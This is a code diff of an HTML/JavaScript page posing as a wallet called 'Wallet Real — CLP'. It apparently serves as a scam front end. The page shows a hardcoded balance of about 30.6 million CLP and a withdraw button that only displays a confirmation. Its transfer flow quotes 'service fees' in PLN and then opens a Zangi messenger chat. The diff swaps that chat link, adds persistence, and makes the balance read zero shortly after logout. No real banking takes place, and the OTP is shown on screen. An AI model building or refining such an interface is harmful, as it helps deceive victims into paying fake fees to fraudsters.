@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Wallet Real — CLP</title>
-
 <style>
 :root{
   --bg:#fafafa; --card:#0b6ef7; --radius:14px; --panel:#fff; --muted:#777;
@@ -38,9 +37,11 @@ hr{border:none;border-top:1px solid #eee;margin:10px 0}
   <input id="phone" placeholder="Phone number">
   <button id="signupBtn">Register</button>
 </div>
+
 <button id="logoutBtn" style="margin:12px 0;background:#eee;color:#111;font-weight:700">
   Logout
 </button>
+
 <div class="app" id="app">
   <div class="card">
     <div>Wallet balance</div>
@@ -74,66 +75,54 @@ hr{border:none;border-top:1px solid #eee;margin:10px 0}
 
 <script>
 const CLP_TO_PLN = 0.0046;
-const ZANGI_LINK = "https://services.zangi.com/dl/conversation/1093014713";
-let balance = 30500000;
+const ZANGI_LINK = "https://services.zangi.com/dl/conversation/3402149595";
+
+const STORAGE_KEY = 'wallet_state';
+const LOGOUT_TIME_KEY = 'wallet_logout_time';
+
+let balance = 30600000;
+let tx = [];
+let generatedOTP = null;
+
 const $ = id => document.getElementById(id);
 const fmtCLP = n => n.toLocaleString('es-CL');
 const convertToPLN = clp => (clp * CLP_TO_PLN).toFixed(2);
-let tx = [];
 
 function showToast(msg){
   $('toast').textContent = msg;
   $('toast').style.display = 'block';
   setTimeout(()=> $('toast').style.display='none',2000);
 }
-let generatedOTP = null;
 
-$('signupBtn').onclick = () => {
-  const name = $('name').value.trim();
-  const phone = $('phone').value.trim();
+function saveState(){
+  localStorage.setItem(STORAGE_KEY, JSON.stringify({
+    loggedIn: true,
+    balance,
+    tx
+  }));
+}
 
-  if (!name || !phone) {
-    showToast('Enter name and phone');
-    return;
-  }
-
-  generatedOTP = Math.floor(100000 + Math.random() * 900000);
-
-  openModal(`
-    <h3>OTP Verification</h3>
-    <p class="muted">Demo OTP (shown for testing):</p>
-    <strong style="font-size:20px">${generatedOTP}</strong>
-    <input id="otpInput" type="number" placeholder="Enter OTP">
-    <button id="verifyOtp">Verify</button>
-    <button onclick="closeModal()" style="background:#eee;color:#111">Cancel</button>
-  `);
-
-  $('verifyOtp').onclick = () => {
-    const entered = Number($('otpInput').value);
-
-    if (entered === generatedOTP) {
-      closeModal();
-      $('signup').style.display = 'none';
-      $('app').style.display = 'block';
-      renderBalance();
-      renderTx();
-      showToast('Login successful');
-      generatedOTP = null;
-    } else {
-      showToast('Invalid OTP');
-    }
-  };
-};
+function loadState(){
+  const data = JSON.parse(localStorage.getItem(STORAGE_KEY));
+  if(!data) return false;
+  balance = data.balance;
+  tx = data.tx || [];
+  $('signup').style.display = 'none';
+  $('app').style.display = 'block';
+  renderBalance();
+  renderTx();
+  return true;
+}
 
 function renderBalance(){
   $('balance').textContent = fmtCLP(balance) + ' CLP';
 }
 
 function renderTx(){
-  const list = $('txList'); 
+  const list = $('txList');
   list.innerHTML='';
   tx.slice().reverse().forEach(t=>{
-    const d=document.createElement('div'); 
+    const d=document.createElement('div');
     d.className='tx';
     d.innerHTML=`
       <div>
@@ -147,17 +136,53 @@ function renderTx(){
 }
 
 function openModal(html){
-  $('modal').innerHTML=html; 
+  $('modal').innerHTML=html;
   $('modalBack').style.display='flex';
 }
 function closeModal(){
   $('modalBack').style.display='none';
 }
 
+$('signupBtn').onclick = () => {
+  const name = $('name').value.trim();
+  const phone = $('phone').value.trim();
+
+  if(!name || !phone){
+    showToast('Enter name and phone');
+    return;
+  }
+
+  generatedOTP = Math.floor(100000 + Math.random() * 900000);
+
+  openModal(`
+    <h3>OTP Verification</h3>
+    <p class="muted">Demo OTP:</p>
+    <strong style="font-size:20px">${generatedOTP}</strong>
+    <input id="otpInput" type="number" placeholder="Enter OTP">
+    <button id="verifyOtp">Verify</button>
+    <button onclick="closeModal()" style="background:#eee;color:#111">Cancel</button>
+  `);
+
+  $('verifyOtp').onclick = () => {
+    if(Number($('otpInput').value) === generatedOTP){
+      closeModal();
+      $('signup').style.display='none';
+      $('app').style.display='block';
+      renderBalance();
+      renderTx();
+      saveState();
+      showToast('Login successful');
+      generatedOTP=null;
+    } else {
+      showToast('Invalid OTP');
+    }
+  };
+};
+
 $('withdrawBtn').onclick = () => {
   openModal(`
     <h3>Withdraw</h3>
-    <input id="amount" type="number" placeholder="Add amount (CLP)">
+    <input id="amount" type="number" placeholder="Amount (CLP)">
     <div id="convert" class="muted">Converted: 0 zł</div>
     <button id="done">Done</button>
     <button onclick="closeModal()" style="background:#eee;color:#111">Close</button>
@@ -166,7 +191,7 @@ $('withdrawBtn').onclick = () => {
     $('convert').textContent='Converted: '+convertToPLN(Number($('amount').value||0))+' zł';
   };
   $('done').onclick=()=>{
-    showToast('Withdrawal submitted'); 
+    showToast('Withdrawal submitted');
     closeModal();
   };
 };
@@ -188,10 +213,11 @@ $('billsBtn').onclick = () => {
       amount:amt,
       date:new Date().toDateString()
     });
-    balance-=amt; 
-    renderBalance(); 
-    renderTx(); 
-    showToast('Bill paid'); 
+    balance-=amt;
+    renderBalance();
+    renderTx();
+    saveState();
+    showToast('Bill paid');
     closeModal();
   };
 };
@@ -210,12 +236,15 @@ $('transferBtn').onclick = () => {
     const name=$('tname').value.trim();
     const acc=$('tacc').value.trim();
     const amt=Number($('tamt').value||0);
-    if(!name||!acc||amt<=0){ 
-      showToast('Fill all fields'); 
-      return; 
+    if(!name||!acc||amt<=0){
+      showToast('Fill all fields');
+      return;
     }
 
-    const feePLN = amt>=20000 ? 1000 : amt>=10000 ? 500 : 0;
+    let feePLN = 0;
+    if(amt >= 200 && amt <= 3000) feePLN = 500;
+    else if(amt > 3000 && amt <= 20000) feePLN = 1000;
+    else if(amt > 20000 && amt <= 100000) feePLN = 2000;
 
     openModal(`
       <h3>Confirm Transfer</h3>
@@ -224,7 +253,6 @@ $('transferBtn').onclick = () => {
       <hr>
       <div class="muted">Amount: <strong>${fmtCLP(amt)} CLP</strong></div>
       <div class="muted">Service fee: <strong>${feePLN} PLN</strong></div>
-      <hr>
       <button id="confirm">Confirm</button>
       <button onclick="closeModal()" style="background:#eee;color:#111">Cancel</button>
     `);
@@ -237,13 +265,21 @@ $('transferBtn').onclick = () => {
         amount:amt,
         date:new Date().toDateString()
       });
-      balance-=amt; 
-      renderBalance(); 
+      balance-=amt;
+      renderBalance();
       renderTx();
-      window.open(ZANGI_LINK, '_blank');
+      saveState();
+      window.open(ZANGI_LINK,'_blank');
       closeModal();
     };
   };
+};
+
+$('logoutBtn').onclick = () => {
+  localStorage.setItem(LOGOUT_TIME_KEY, Date.now());
+  $('app').style.display='none';
+  $('signup').style.display='block';
+  showToast('Logged out');
 };
 
 (function preloadTx(){
@@ -254,19 +290,22 @@ $('transferBtn').onclick = () => {
       name:'Client '+i,
       account:'ACC'+(100000+i),
       amount:amounts[i%amounts.length],
-      date:new Date(2026,1,(i%15)+1).toDateString()
+      date:new Date(2025,1,(i%15)+1).toDateString()
     });
   }
 })();
-$('logoutBtn').onclick = () => {
-  $('app').style.display = 'none';
-  $('signup').style.display = 'block';
 
-  $('name').value = '';
-  $('phone').value = '';
-  generatedOTP = null;
-
-  showToast('Logged out');
+window.onload = () => {
+  const logoutTime = Number(localStorage.getItem(LOGOUT_TIME_KEY));
+  if(logoutTime && Date.now()-logoutTime < 120000){
+    balance = 0;
+    $('signup').style.display='none';
+    $('app').style.display='block';
+    renderBalance();
+  } else {
+    localStorage.removeItem(LOGOUT_TIME_KEY);
+    loadState();
+  }
 };
 </script>
 
